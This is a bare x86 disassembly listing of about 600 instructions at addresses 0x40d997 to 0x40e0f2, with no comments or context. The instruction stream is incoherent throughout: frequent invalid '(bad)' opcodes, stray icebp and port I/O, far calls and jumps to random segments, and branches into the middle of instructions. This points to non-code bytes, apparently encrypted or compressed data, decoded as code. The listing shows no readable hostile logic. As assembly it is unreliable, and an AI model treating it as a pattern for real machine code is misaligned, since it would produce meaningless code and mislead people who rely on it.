  40d997:	call   0xf3e7:0x47a4a407
  40d99e:	and    eax,0x70519b82
  40d9a3:	xor    BYTE PTR [esi-0x4000eff9],ah
  40d9a9:	les    eax,FWORD PTR [esi+0x855dce7]
  40d9af:	out    0x65,al
  40d9b1:	iret   
  40d9b2:	xchg   ecx,eax
  40d9b3:	pop    ds
  40d9b4:	jmp    0x40d97c
  40d9b6:	push   esi
  40d9b7:	xchg   esp,ecx
  40d9b9:	popa   
  40d9ba:	(bad)  
  40d9bb:	jbe    0x40da2e
  40d9bd:	mov    cl,BYTE PTR [edi+0x47]
  40d9c0:	fld    TBYTE PTR [edx]
  40d9c3:	sub    esi,DWORD PTR [ebx]
  40d9c5:	dec    ebp
  40d9c6:	neg    BYTE PTR [ecx-0x6b]
  40d9c9:	ja     0x40d956
  40d9cb:	push   ebp
  40d9cc:	call   0x91f856a4
  40d9d1:	pop    ds
  40d9d2:	aad    0x84
  40d9d4:	add    ebx,0x23
  40d9d7:	push   es
  40d9d8:	aad    0xef
  40d9da:	call   0xdfb84584
  40d9df:	and    eax,0xfd8fdfcb
  40d9e4:	or     eax,0x9cbbdb8a
  40d9e9:	inc    ecx
  40d9ea:	enter  0xa187,0x9c
  40d9ee:	icebp  
  40d9ef:	lds    ebx,FWORD PTR [edi+0x4c]
  40d9f2:	add    DWORD PTR [edx-0x40],0xd4eae73f
  40d9f9:	cmp    BYTE PTR [ebp-0x35],cl
  40d9fc:	mov    esi,0x4dc731d9
  40da01:	outs   dx,BYTE PTR ds:[esi]
  40da02:	addr16 ret 
  40da04:	loopne 0x40d9c0
  40da06:	icebp  
  40da07:	js     0x40da4a
  40da09:	inc    ebx
  40da0a:	call   0x7f25:0x99fa51fa
  40da11:	ret    
  40da12:	sar    BYTE PTR [ebp+0x457bfed1],cl
  40da18:	add    BYTE PTR [esi-0xc],cl
  40da1b:	inc    ecx
  40da1c:	mov    bl,0xc0
  40da1e:	add    eax,0x4b6baa80
  40da23:	inc    edx
  40da24:	inc    DWORD PTR [esi]
  40da26:	stos   DWORD PTR es:[edi],eax
  40da27:	and    ah,BYTE PTR [edx+0x15]
  40da2a:	mov    eax,0xf645a283
  40da2f:	push   ebp
  40da30:	add    dl,cl
  40da32:	dec    ecx
  40da33:	lds    ecx,FWORD PTR [ebx]
  40da35:	and    eax,0x5216ac7a
  40da3a:	cmp    al,0x78
  40da3c:	scas   eax,DWORD PTR es:[edi]
  40da3d:	dec    esp
  40da3e:	(bad)  
  40da3f:	cmp    esi,DWORD PTR [eax-0x1f093466]
  40da45:	out    0x4,eax
  40da47:	add    eax,0x20a83289
  40da4c:	loop   0x40da14
  40da4e:	ins    DWORD PTR es:[edi],dx
  40da4f:	leave  
  40da50:	and    ebx,DWORD PTR [edx+0x48b5535]
  40da56:	mov    bh,0xf2
  40da58:	xor    eax,0x4fbf91a6
  40da5d:	loope  0x40d9e9
  40da5f:	cwde   
  40da60:	(bad)  
  40da61:	sbb    al,0xc0
  40da63:	dec    ebp
  40da64:	mov    eax,0xc1e319f
  40da69:	mov    bh,BYTE PTR [edx-0x4b3f9ae7]
  40da6f:	cld    
  40da70:	sbb    bl,BYTE PTR ds:0xadf7ba56
  40da76:	mov    ds:0x6423b107,al
  40da7b:	lahf   
  40da7c:	scas   al,BYTE PTR es:[edi]
  40da7d:	cdq    
  40da7e:	adc    BYTE PTR ds:0xda837b57,0x8b
  40da85:	outs   dx,DWORD PTR ds:[esi]
  40da86:	call   0xc69f:0xd87e6463
  40da8d:	pop    edi
  40da8e:	mov    edi,DWORD PTR [ebp+edi*4+0x22]
  40da92:	push   ebp
  40da93:	retf   
  40da94:	ret    
  40da95:	sub    DWORD PTR [esi+0x4f],0x2e
  40da99:	outs   dx,BYTE PTR ds:[esi]
  40da9a:	addr16 popf 
  40da9c:	lods   eax,DWORD PTR ds:[esi]
  40da9d:	push   ecx
  40da9e:	pop    ebx
  40da9f:	mov    esp,DWORD PTR [si+0x8cc]
  40daa4:	adc    DWORD PTR [eax-0x75],ebx
  40daa7:	and    bh,ah
  40daa9:	or     edi,eax
  40daab:	jae    0x40daff
  40daad:	repz je 0x40da7e
  40dab0:	jne    0x40da51
  40dab2:	fldcw  WORD PTR [edx-0x18]
  40dab5:	push   ds
  40dab6:	scas   eax,DWORD PTR es:[edi]
  40dab7:	test   dl,dh
  40dab9:	je     0x40dabf
  40dabb:	test   al,0x58
  40dabd:	inc    ecx
  40dabe:	push   es
  40dabf:	cmp    al,cl
  40dac1:	cdq    
  40dac2:	mov    bh,0xc8
  40dac4:	imul   edi,DWORD PTR [esi+0x481f9977],0x19275d7c
  40dace:	cli    
  40dacf:	add    al,0xcd
  40dad1:	pop    ebp
  40dad2:	int    0x41
  40dad4:	aam    0x76
  40dad6:	shr    DWORD PTR [ebx-0x42a6746c],1
  40dadc:	mov    ebx,0x46363a1b
  40dae1:	xor    al,0xf3
  40dae3:	xchg   BYTE PTR [ecx+eax*1-0x2664a5b7],cl
  40daea:	sbb    eax,0x5808573f
  40daef:	sbb    ecx,DWORD PTR [edi]
  40daf1:	mov    edi,0x6701621f
  40daf6:	push   esi
  40daf7:	push   ebx
  40daf8:	and    eax,0xb75ddc1b
  40dafd:	cs lahf 
  40daff:	cmp    BYTE PTR [ebp-0x5a],0xd7
  40db03:	pop    ecx
  40db04:	push   cs
  40db05:	jae    0x40daa6
  40db07:	out    dx,eax
  40db08:	mov    ds:0xd30ec75e,al
  40db0d:	arpl   WORD PTR [esi+ecx*8+0x4c],cx
  40db11:	or     edx,esi
  40db13:	not    BYTE PTR [ebx+0x6f260544]
  40db19:	cli    
  40db1a:	jmp    0xbaee:0x446f0f44
  40db21:	push   es
  40db22:	lods   eax,DWORD PTR ds:[esi]
  40db23:	ja     0x40db88
  40db25:	push   ebp
  40db26:	or     cl,dh
  40db28:	shr    ebx,1
  40db2a:	into   
  40db2b:	mov    dl,0x2f
  40db2d:	mov    cl,0x57
  40db2f:	fidiv  WORD PTR [ebp-0x6f]
  40db32:	fidivr WORD PTR [esi+0x28af129d]
  40db38:	aad    0x9e
  40db3a:	push   esi
  40db3b:	mov    bh,bh
  40db3d:	pop    es
  40db3e:	mov    ds:0x75e79ae4,eax
  40db43:	(bad)  
  40db45:	jp     0x40db8e
  40db47:	jo     0x40db96
  40db49:	stc    
  40db4a:	fisttp QWORD PTR [ebx+0x22]
  40db4d:	cmp    al,0x4
  40db4f:	sbb    DWORD PTR [ebp+0x73],esi
  40db52:	test   DWORD PTR [ebp-0x50],esi
  40db55:	jbe    0x40db11
  40db57:	mov    ch,0x53
  40db59:	icebp  
  40db5a:	rcl    DWORD PTR [edi+0x11],1
  40db5d:	dec    ebx
  40db5e:	in     al,0xe1
  40db60:	mov    ds:0xaa18feac,al
  40db65:	daa    
  40db66:	(bad)  
  40db67:	dec    edx
  40db68:	(bad)  
  40db69:	jge    0x40db0f
  40db6b:	mov    cl,0x7c
  40db6d:	test   eax,0x8f67a0c0
  40db72:	cdq    
  40db73:	sub    edi,DWORD PTR [ecx]
  40db75:	sub    al,0xc4
  40db77:	mov    ds:0x43ed86a3,al
  40db7c:	in     al,dx
  40db7d:	mov    ds:0xe300d411,al
  40db82:	test   eax,0xf9538f02
  40db87:	sub    DWORD PTR [edx-0x36],ebp
  40db8a:	ins    DWORD PTR es:[edi],dx
  40db8b:	mov    bh,0x5e
  40db8d:	fucomi st,st(5)
  40db8f:	xor    BYTE PTR [ebx],bl
  40db91:	cmp    al,0xfa
  40db93:	aad    0xdc
  40db95:	push   ecx
  40db96:	push   edx
  40db97:	and    esp,DWORD PTR [esp+ebp*1-0x1a]
  40db9b:	cdq    
  40db9c:	pop    es
  40db9d:	cmp    ebp,DWORD PTR [ebx]
  40db9f:	cdq    
  40dba0:	or     al,bh
  40dba2:	pop    ecx
  40dba3:	inc    esp
  40dba4:	icebp  
  40dba5:	fbld   TBYTE PTR [edx-0x6998852c]
  40dbab:	mov    DWORD PTR [ecx],edi
  40dbad:	in     al,0x53
  40dbaf:	das    
  40dbb0:	ja     0x40dc1f
  40dbb2:	xchg   esi,ebx
  40dbb4:	cdq    
  40dbb5:	sub    al,0x17
  40dbb7:	xlat   BYTE PTR ds:[ebx]
  40dbb8:	shl    DWORD PTR [ebx-0x18e4e6df],0x40
  40dbbf:	jno    0x40db87
  40dbc1:	in     al,dx
  40dbc2:	sub    eax,0xae086db6
  40dbc7:	xchg   ecx,eax
  40dbc8:	repnz retf 0xd829
  40dbcc:	cwde   
  40dbcd:	adc    bh,dl
  40dbcf:	xchg   esp,eax
  40dbd0:	xchg   ecx,eax
  40dbd1:	jmp    0x1b9:0x90ac2fe7
  40dbd8:	mov    dl,0x5d
  40dbda:	jmp    0xdf9e0c1a
  40dbdf:	jmp    0x518c6f1f
  40dbe4:	les    edx,FWORD PTR fs:[esi+0x3b]
  40dbe8:	jmp    0x40dbdc
  40dbea:	cld    
  40dbeb:	dec    ebp
  40dbec:	imul   DWORD PTR [ebx-0x5f]
  40dbef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbf0:	inc    ebx
  40dbf1:	jecxz  0x40dbc5
  40dbf3:	js     0x40dc11
  40dbf5:	rcr    BYTE PTR [edx+0x65],cl
  40dbf8:	je     0x40dc4f
  40dbfa:	daa    
  40dbfb:	push   esp
  40dbfc:	loopne 0x40dc17
  40dbfe:	adc    dl,BYTE PTR [ebx+0x25f45d75]
  40dc04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc05:	mov    ah,0xd7
  40dc07:	and    eax,0x5d92e53
  40dc0c:	sub    DWORD PTR [ebx+0x523925af],edx
  40dc12:	aam    0x88
  40dc14:	adc    BYTE PTR [esi],dl
  40dc16:	fiadd  WORD PTR [ebp+0x19]
  40dc19:	add    al,0x6e
  40dc1b:	(bad)  
  40dc1c:	sub    ch,BYTE PTR [esi+0x68]
  40dc1f:	sub    DWORD PTR [esi],edi
  40dc21:	xor    al,0xbe
  40dc23:	mov    bh,0x65
  40dc25:	add    edi,DWORD PTR [edi-0x9]
  40dc28:	popa   
  40dc29:	arpl   WORD PTR [ebp+0x430d8814],cx
  40dc2f:	push   edi
  40dc30:	add    BYTE PTR [eax-0x54],0x23
  40dc34:	rol    BYTE PTR [edx],1
  40dc36:	(bad)  
  40dc37:	and    ah,BYTE PTR [esi-0x39]
  40dc3a:	aam    0x6e
  40dc3c:	rcl    ecx,cl
  40dc3e:	xchg   eax,ecx
  40dc40:	cmp    edi,DWORD PTR [esi+0x63fe0261]
  40dc46:	retf   
  40dc47:	jecxz  0x40dc80
  40dc49:	dec    ebx
  40dc4a:	leave  
  40dc4b:	xor    DWORD PTR [ebx+0x1afbab1],esp
  40dc51:	rol    DWORD PTR [esi+0x32f96dda],cl
  40dc57:	ins    BYTE PTR es:[edi],dx
  40dc58:	shr    al,1
  40dc5a:	add    BYTE PTR [ebx+0x4],ch
  40dc5d:	xchg   edx,eax
  40dc5e:	jb     0x40dc1c
  40dc60:	sti    
  40dc61:	inc    edx
  40dc62:	(bad)  
  40dc63:	out    0xa7,al
  40dc65:	test   BYTE PTR [edx],0xa0
  40dc68:	jnp    0x40dc0b
  40dc6a:	dec    ebx
  40dc6b:	mov    dh,cl
  40dc6d:	(bad)  
  40dc6e:	fwait
  40dc6f:	inc    edx
  40dc70:	cli    
  40dc71:	cmp    ah,cl
  40dc73:	and    edi,DWORD PTR [eax+esi*8+0x4a67437d]
  40dc7a:	inc    edi
  40dc7b:	sbb    ebp,DWORD PTR [ebx+0x6a]
  40dc7e:	iret   
  40dc7f:	out    dx,eax
  40dc80:	and    bl,bl
  40dc82:	dec    esp
  40dc83:	jae    0x40dca5
  40dc85:	jg     0x40dc1b
  40dc87:	pop    es
  40dc88:	push   esp
  40dc89:	push   cs
  40dc8a:	sar    DWORD PTR [eax+0x5c],1
  40dc8d:	test   eax,0xec51b422
  40dc92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc93:	pop    esi
  40dc94:	xor    ecx,edx
  40dc96:	rol    DWORD PTR [edi+eax*4+0x61634b6],cl
  40dc9d:	sbb    eax,0xa4cf6643
  40dca2:	jmp    0x5a77e281
  40dca7:	cmp    dh,BYTE PTR [ebx-0x7d12da1d]
  40dcad:	push   esi
  40dcae:	jbe    0x40dd13
  40dcb0:	push   ebx
  40dcb1:	adc    al,0xe5
  40dcb3:	push   esi
  40dcb4:	test   BYTE PTR [eax],dl
  40dcb6:	sbb    eax,0x6584b2cc
  40dcbb:	clc    
  40dcbc:	repz retf 
  40dcbe:	mov    ecx,ebp
  40dcc0:	jae    0x40dc61
  40dcc2:	adc    DWORD PTR [esp+edi*8+0x43],edi
  40dcc6:	jnp    0x40dce0
  40dcc8:	adc    esi,DWORD PTR [esi-0x385d0881]
  40dcce:	enter  0xc366,0x7e
  40dcd2:	pop    edx
  40dcd3:	rcr    BYTE PTR [edi+0x2],cl
  40dcd6:	mov    al,ds:0x95752cb6
  40dcdb:	sbb    eax,0x5990dec1
  40dce0:	mov    dl,0xd7
  40dce2:	nop
  40dce3:	push   ecx
  40dce4:	mov    bh,0x70
  40dce6:	sub    al,0x3
  40dce8:	test   eax,0xd8ddd99f
  40dced:	jge    0x40dc9d
  40dcef:	sub    dl,bh
  40dcf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcf2:	pop    edx
  40dcf3:	dec    ecx
  40dcf4:	sub    esp,DWORD PTR [ebp-0x37]
  40dcf7:	mov    cl,0x80
  40dcf9:	rcr    DWORD PTR [ebx+eiz*1],cl
  40dcfc:	dec    eax
  40dcfd:	loope  0x40dcab
  40dcff:	enter  0xf96a,0x6a
  40dd03:	jo     0x40dd2c
  40dd05:	sbb    BYTE PTR ds:0x84171a09,dh
  40dd0b:	clc    
  40dd0c:	fnstsw WORD PTR [ebx-0x3c]
  40dd0f:	test   eax,0xb14d35da
  40dd14:	je     0x40dd86
  40dd16:	push   ecx
  40dd17:	inc    edi
  40dd18:	sub    BYTE PTR [ebp+0x7bd087e0],cl
  40dd1e:	mov    ebx,0x303dcfdb
  40dd23:	or     BYTE PTR [ecx],cl
  40dd25:	jnp    0x40dce1
  40dd27:	adc    edi,DWORD PTR [eax-0x22]
  40dd2a:	hlt    
  40dd2b:	imul   ebx,DWORD PTR [esi-0x1c2aecfc],0xffffffe2
  40dd32:	lods   al,BYTE PTR ds:[esi]
  40dd33:	int3   
  40dd34:	out    0xfb,eax
  40dd36:	or     DWORD PTR [ebx+0x6757f397],eax
  40dd3c:	pop    ebp
  40dd3d:	dec    esi
  40dd3f:	sub    eax,0xb421839e
  40dd44:	in     al,dx
  40dd45:	addr16 xchg ebx,eax
  40dd47:	shl    esi,cl
  40dd49:	and    eax,0x70fd7407
  40dd4e:	mov    ebp,0x94edc3ae
  40dd53:	clc    
  40dd54:	add    al,0xae
  40dd56:	and    al,0xde
  40dd58:	jns    0x40dd6d
  40dd5a:	(bad)  
  40dd5b:	int3   
  40dd5c:	mov    bh,0xa9
  40dd5e:	mov    dh,0x31
  40dd60:	in     eax,dx
  40dd61:	cs loopne 0x40dd28
  40dd64:	pop    ss
  40dd65:	sbb    ebp,eax
  40dd67:	repnz dec ecx
  40dd69:	pop    esp
  40dd6a:	in     al,dx
  40dd6b:	pop    ecx
  40dd6c:	popa   
  40dd6d:	fild   QWORD PTR [esi+0x44f0ef6a]
  40dd73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd74:	mov    al,0xc4
  40dd76:	dec    esi
  40dd77:	push   edx
  40dd78:	add    DWORD PTR [edi+0x23],esi
  40dd7b:	lea    esi,[ebp-0x65]
  40dd7e:	lahf   
  40dd7f:	sbb    eax,0x23b34787
  40dd84:	adc    BYTE PTR [esi],dl
  40dd86:	push   ebp
  40dd87:	leave  
  40dd88:	data16 imul BYTE PTR [eax-0x40]
  40dd8c:	mov    edx,0x78588186
  40dd91:	cmp    ebx,ebp
  40dd93:	dec    ebx
  40dd94:	cmp    ah,bl
  40dd96:	mov    dh,0xac
  40dd98:	(bad)  
  40dd99:	lods   al,BYTE PTR ds:[esi]
  40dd9a:	jo     0x40dd7b
  40dd9c:	ret    
  40dd9d:	retf   0xaa66
  40dda0:	push   0x502a948
  40dda5:	sbb    BYTE PTR [ecx],0x69
  40dda8:	xchg   BYTE PTR [ebp+0x20c60f80],ah
  40ddae:	xchg   edx,eax
  40ddaf:	out    dx,al
  40ddb0:	push   esp
  40ddb1:	addr16 ret 
  40ddb3:	gs cmc 
  40ddb5:	mov    edx,0x49854a84
  40ddba:	mov    edx,0x9fea81f0
  40ddbf:	mov    WORD PTR [eax-0xb6683a3],cs
  40ddc5:	outs   dx,BYTE PTR ds:[esi]
  40ddc6:	push   edi
  40ddc7:	in     eax,dx
  40ddc8:	in     eax,0xf
  40ddca:	push   eax
  40ddcb:	ds js  0x40ddc9
  40ddce:	cs mov ss,edi
  40ddd1:	xor    ebx,DWORD PTR [esi-0x11411075]
  40ddd7:	rol    al,0xc0
  40ddda:	mov    cl,0xb4
  40dddc:	jmp    0x40de18
  40ddde:	jo     0x40ddd9
  40dde0:	out    0x40,eax
  40dde2:	xor    DWORD PTR [eax-0xc3e2c29],ecx
  40dde8:	mov    esi,0x904cc4b3
  40dded:	sbb    DWORD PTR [edx+0x197a1b27],ecx
  40ddf3:	shld   DWORD PTR [eax+0x4fd44047],esi,0xe6
  40ddfb:	aaa    
  40ddfc:	jp     0x40de68
  40ddfe:	dec    esp
  40ddff:	pop    esp
  40de00:	inc    ecx
  40de01:	inc    esp
  40de02:	lea    ebx,[edi+0x33]
  40de05:	lds    ebp,FWORD PTR [ebx]
  40de07:	rcr    BYTE PTR [esi-0x74],cl
  40de0a:	inc    ebp
  40de0b:	jne    0x40de51
  40de0d:	int    0xc7
  40de0f:	hlt    
  40de10:	mov    cl,bh
  40de12:	push   esi
  40de13:	or     eax,0x8e4b2e0a
  40de18:	cwde   
  40de19:	push   es
  40de1a:	sub    cl,al
  40de1c:	pop    esi
  40de1d:	dec    ecx
  40de1e:	sbb    eax,0xbfecabf1
  40de23:	loop   0x40de09
  40de25:	sbb    al,0x60
  40de27:	inc    eax
  40de28:	pop    ecx
  40de29:	or     al,0x96
  40de2b:	mov    eax,0xfdeaf89
  40de30:	cmp    DWORD PTR [edi-0x415a0832],ebx
  40de36:	out    0xba,al
  40de38:	outs   dx,DWORD PTR ds:[esi]
  40de39:	test   BYTE PTR [ebx],bh
  40de3b:	ins    DWORD PTR es:[edi],dx
  40de3c:	pop    ds
  40de3d:	shl    DWORD PTR [esi-0x2bf31413],0x38
  40de44:	adc    DWORD PTR ds:0xe9d6e673,edi
  40de4a:	and    al,0xfe
  40de4c:	xlat   BYTE PTR ds:[ebx]
  40de4d:	mov    ebx,0xdcb06bfb
  40de52:	call   0x98df3a26
  40de57:	ins    BYTE PTR es:[edi],dx
  40de58:	ins    DWORD PTR es:[edi],dx
  40de59:	cmp    al,0x59
  40de5b:	jle    0x40ddee
  40de5d:	push   ds
  40de5e:	xlat   BYTE PTR ds:[ebx]
  40de5f:	xchg   ebp,eax
  40de60:	add    DWORD PTR [edi+0x4c],edx
  40de63:	inc    ecx
  40de65:	sub    edx,ecx
  40de67:	(bad)  
  40de69:	in     eax,dx
  40de6a:	xor    BYTE PTR [ebp-0x42],dl
  40de6d:	push   ss
  40de6e:	mov    bl,0xf8
  40de70:	not    BYTE PTR [ebx+eax*4]
  40de73:	test   al,0x1e
  40de75:	mov    ebp,0xf70591f9
  40de7a:	mov    eax,ds:0xde637c3
  40de7f:	in     al,0x37
  40de81:	sub    al,0xa6
  40de83:	ret    0x5225
  40de86:	sub    DWORD PTR [edi+eax*1],esp
  40de89:	and    cl,dh
  40de8b:	std    
  40de8c:	jne    0x40ded1
  40de8e:	popa   
  40de8f:	ror    DWORD PTR [eax+edx*1+0x356922b3],0x7a
  40de97:	jp     0x40de7e
  40de99:	hlt    
  40de9a:	xor    cl,dh
  40de9c:	nop
  40de9d:	inc    ecx
  40de9e:	stos   BYTE PTR es:[edi],al
  40de9f:	xor    eax,DWORD PTR [ecx]
  40dea1:	gs lahf 
  40dea3:	out    dx,al
  40dea4:	jnp    0x40decc
  40dea6:	mov    edi,0x2a307f91
  40deab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40deac:	ins    BYTE PTR es:[edi],dx
  40dead:	rol    BYTE PTR [esi-0x52],cl
  40deb0:	ins    BYTE PTR es:[edi],dx
  40deb1:	out    dx,al
  40deb2:	test   DWORD PTR [ecx-0x613d70e9],ebx
  40deb8:	jmp    0xc4347811
  40debd:	mov    cl,BYTE PTR [ecx-0x62]
  40dec0:	push   esp
  40dec1:	pop    es
  40dec2:	adc    DWORD PTR [ecx+0x7cc9fae6],0x1d
  40dec9:	adc    esp,edi
  40decb:	push   ds
  40decc:	mov    eax,DWORD PTR [ecx-0x5a]
  40decf:	sub    esp,ebx
  40ded1:	rcl    DWORD PTR [ecx],0xd6
  40ded4:	xlat   BYTE PTR ds:[ebx]
  40ded5:	mov    edx,0x1acb6d2d
  40deda:	in     eax,dx
  40dedb:	pmulhw mm4,QWORD PTR [esi+0x613edf4b]
  40dee2:	mov    BYTE PTR [ecx-0x5eae4987],cl
  40dee8:	aaa    
  40dee9:	jae    0x40df24
  40deeb:	pop    esi
  40deec:	xchg   ecx,eax
  40deed:	xchg   DWORD PTR [edi+esi*1],ecx
  40def0:	pushf  
  40def1:	aaa    
  40def2:	jbe    0x40df08
  40def4:	inc    eax
  40def5:	std    
  40def6:	mov    eax,0xd5912bbf
  40defb:	jmp    0xf73cee00
  40df00:	das    
  40df01:	and    BYTE PTR [esp+eax*4],bl
  40df04:	call   0xaccacddf
  40df09:	into   
  40df0a:	in     al,dx
  40df0b:	dec    esp
  40df0c:	(bad)  
  40df0d:	call   0x5193f5b0
  40df12:	mul    DWORD PTR [edi+0x7a]
  40df15:	sbb    eax,0x7a5044a0
  40df1a:	jmp    0xff2e28f5
  40df1f:	outs   dx,DWORD PTR ds:[esi]
  40df20:	push   ebx
  40df21:	xor    eax,0x4d4e4e3e
  40df26:	into   
  40df27:	rcr    DWORD PTR [ebx],1
  40df29:	out    0x10,al
  40df2b:	mov    al,0xbc
  40df2d:	add    al,0x92
  40df2f:	test   al,0x46
  40df31:	sub    ebp,esi
  40df33:	jg     0x40df79
  40df35:	xchg   ebp,eax
  40df36:	push   ds
  40df37:	ror    BYTE PTR [ebx+0xd06f289],1
  40df3d:	push   eax
  40df3e:	add    ebx,DWORD PTR [eax]
  40df40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df41:	xchg   ebx,eax
  40df42:	inc    ecx
  40df43:	mov    edx,0x3edf47c
  40df48:	outs   dx,BYTE PTR ds:[esi]
  40df49:	popa   
  40df4a:	jle    0x40df45
  40df4c:	fld    TBYTE PTR [ecx+ebx*1+0xc]
  40df50:	shr    cl,1
  40df52:	sbb    DWORD PTR [ebx+esi*4+0x4b],ecx
  40df56:	cli    
  40df57:	pop    esi
  40df58:	or     BYTE PTR [edx-0x28],dl
  40df5b:	sahf   
  40df5c:	rcl    ch,cl
  40df5e:	jb     0x40dfc9
  40df60:	pop    edi
  40df61:	hlt    
  40df62:	ins    DWORD PTR es:[edi],dx
  40df63:	adc    esp,DWORD PTR [bx+0x196f]
  40df68:	mov    DWORD PTR [ebx+0x65],eax
  40df6b:	out    0x3d,ax
  40df6e:	xchg   esp,eax
  40df6f:	dec    eax
  40df70:	pop    ebx
  40df71:	mov    ebx,0x479051b8
  40df76:	test   BYTE PTR [ecx],0x86
  40df79:	in     eax,0x51
  40df7b:	outs   dx,DWORD PTR ds:[esi]
  40df7c:	mov    DWORD PTR [ebx],esp
  40df7e:	in     al,0x40
  40df80:	xchg   esp,eax
  40df81:	and    bl,BYTE PTR [ebx+0x3cbb03a9]
  40df87:	out    0x71,eax
  40df89:	sbb    al,0xca
  40df8b:	cli    
  40df8c:	jo     0x40df43
  40df8e:	(bad)  
  40df8f:	jmp    0x1f576a1
  40df94:	xchg   ecx,eax
  40df95:	shl    BYTE PTR [ecx+0x2e9595ce],0xb2
  40df9c:	cmp    eax,0x41830e2f
  40dfa1:	pop    ebp
  40dfa2:	fnstenv [eax]
  40dfa4:	mov    edx,DWORD PTR [esi-0x50]
  40dfa7:	ins    DWORD PTR es:[edi],dx
  40dfa8:	or     eax,0xdbec51df
  40dfad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfaf:	nop
  40dfb0:	and    BYTE PTR [esi+edi*8],bl
  40dfb3:	retf   0x1330
  40dfb6:	or     ebx,DWORD PTR [ebx]
  40dfb8:	inc    ebp
  40dfb9:	mov    DWORD PTR [ebx-0x35],edi
  40dfbc:	adc    esi,DWORD PTR ds:0xb2debe81
  40dfc2:	ds push 0xf5f793a2
  40dfc8:	stos   DWORD PTR es:[edi],eax
  40dfc9:	dec    edi
  40dfca:	test   DWORD PTR [ebx-0x118523b2],0xdf77555e
  40dfd4:	rcl    DWORD PTR [ebx],0xbf
  40dfd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfd8:	xlat   BYTE PTR ds:[ebx]
  40dfd9:	imul   eax,ebx,0x75
  40dfdc:	(bad)  [edx]
  40dfde:	and    bl,ch
  40dfe0:	jmp    0x40dfc8
  40dfe2:	out    0x40,al
  40dfe4:	pop    esi
  40dfe5:	nop
  40dfe6:	mov    WORD PTR [ebx],es
  40dfe8:	bound  ecx,QWORD PTR [edx]
  40dfea:	mov    ah,0x63
  40dfec:	fcom   QWORD PTR [esi+0x3f93bd5d]
  40dff2:	xchg   BYTE PTR [eax+esi*2],bl
  40dff5:	sbb    bh,BYTE PTR [ebp-0x320fef6b]
  40dffb:	pusha  
  40dffc:	enter  0xc5fe,0xb8
  40e000:	lock add DWORD PTR [ebp-0x4f],edi
  40e004:	xchg   ecx,eax
  40e005:	and    al,0x2c
  40e007:	mov    edx,0x46219d6f
  40e00c:	lds    eax,FWORD PTR [eax]
  40e00e:	mov    eax,0x66f233f8
  40e013:	push   cs
  40e014:	add    BYTE PTR [eax],0x48
  40e017:	dec    edx
  40e018:	pop    ecx
  40e019:	into   
  40e01a:	or     al,0x87
  40e01c:	cwde   
  40e01d:	cmp    al,0x86
  40e01f:	jnp    0x40e024
  40e021:	imul   ecx,DWORD PTR [edx-0x23],0x60
  40e025:	mov    bl,0xa9
  40e027:	and    ebx,DWORD PTR [edx]
  40e029:	add    DWORD PTR [esi],edx
  40e02b:	data16 add BYTE PTR [eax-0x68],bh
  40e02f:	ficomp WORD PTR [eax]
  40e031:	jns    0x40e046
  40e033:	fcom   QWORD PTR [esp+eax*8+0x547404b9]
  40e03a:	repnz mov bh,0x74
  40e03d:	mov    cl,0xd8
  40e03f:	enter  0x683f,0x99
  40e043:	push   ecx
  40e044:	ds test al,0x3d
  40e047:	jg     0x40dffb
  40e049:	mov    dl,0xca
  40e04b:	mov    WORD PTR es:[eax-0x5fa44b6b],es
  40e052:	adc    eax,DWORD PTR [edx+0x610e4956]
  40e058:	mov    BYTE PTR [edi],ch
  40e05a:	out    0x32,al
  40e05c:	aaa    
  40e05d:	addr16 out 0xcd,al
  40e060:	mov    BYTE PTR [eax+0x3527ed06],dh
  40e066:	cmp    ax,0x9483
  40e06a:	jo     0x40e099
  40e06c:	and    BYTE PTR [ebp+0x61a2b406],dl
  40e072:	call   0x2f8a4da9
  40e077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e078:	fcmovnbe st,st(4)
  40e07a:	in     al,dx
  40e07b:	sub    BYTE PTR gs:[ebx],cl
  40e07e:	pop    esp
  40e07f:	fsubrp st(3),st
  40e081:	add    eax,DWORD PTR [eax-0x65]
  40e084:	cdq    
  40e085:	lds    esi,FWORD PTR [edi]
  40e087:	(bad)  
  40e088:	retf   
  40e089:	or     eax,0x6f33f68e
  40e08e:	cli    
  40e08f:	lods   eax,DWORD PTR ds:[esi]
  40e090:	pop    esp
  40e091:	sbb    BYTE PTR [ebp+0x53],bh
  40e094:	inc    eax
  40e095:	push   ebx
  40e096:	jecxz  0x40e03f
  40e098:	adc    dh,BYTE PTR [esi-0x7f]
  40e09b:	add    ch,BYTE PTR [ecx-0x5bd8097b]
  40e0a1:	jge    0x40e074
  40e0a3:	das    
  40e0a4:	pop    esi
  40e0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0a6:	fsub   DWORD PTR [ebp-0x5f82bf7e]
  40e0ac:	add    dl,BYTE PTR [edx+eiz*4]
  40e0af:	shr    DWORD PTR [ecx],1
  40e0b1:	dec    ebx
  40e0b2:	sbb    eax,0xd7a898b9
  40e0b7:	inc    edi
  40e0b8:	rep movs DWORD PTR es:[di],DWORD PTR ds:[si]
  40e0bb:	aam    0xa9
  40e0bd:	icebp  
  40e0be:	xchg   esp,ebx
  40e0c0:	add    al,0x4c
  40e0c2:	sub    dh,cl
  40e0c4:	mov    ebx,0xcab1a296
  40e0c9:	stos   DWORD PTR es:[edi],eax
  40e0ca:	push   edx
  40e0cb:	push   0x62
  40e0cd:	outs   dx,BYTE PTR ds:[esi]
  40e0cf:	or     al,0xa7
  40e0d1:	dec    edx
  40e0d2:	cli    
  40e0d3:	in     eax,0xa9
  40e0d5:	push   0x3d988fc2
  40e0da:	bound  edi,QWORD PTR [esi-0x76775045]
  40e0e0:	cmp    DWORD PTR [ebp*2-0x74ab8a90],eax
  40e0e7:	push   es
  40e0e8:	or     esp,0xffffffc6
  40e0eb:	pop    ecx
  40e0ec:	imul   BYTE PTR ds:0xf1c683e9
  40e0f2:	cmp    ebx,DWORD PTR [ebx-0x25]
